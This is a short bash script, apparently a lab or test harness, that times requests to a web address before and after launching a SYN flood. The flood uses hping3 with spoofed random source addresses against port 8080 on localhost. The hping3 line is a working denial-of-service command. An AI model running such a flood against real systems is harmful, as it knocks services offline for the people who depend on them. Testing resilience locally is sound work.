#!/bin/bash

echo "sleeping 5"

sleep 5

echo "curl victim"

curl -w "DNS Lookup: %{time_namelookup}s\n\
Connect: %{time_connect}s\n\
Start Transfer: %{time_starttransfer}s\n\
Total: %{time_total}s\n" -o /dev/null -s http://example.com

echo "sleeping 5"

sleep 5

echo "Running attack..."

hping3 --count 15000 --data 120 --syn --win 64 -p 8080 --flood --rand-source 127.0.0.1 &

echo "sleeping 5"

sleep 5

curl -w "DNS Lookup: %{time_namelookup}s\n\
Connect: %{time_connect}s\n\
Start Transfer: %{time_starttransfer}s\n\
Total: %{time_total}s\n" -o /dev/null -s http://example.com

tail -f /dev/null
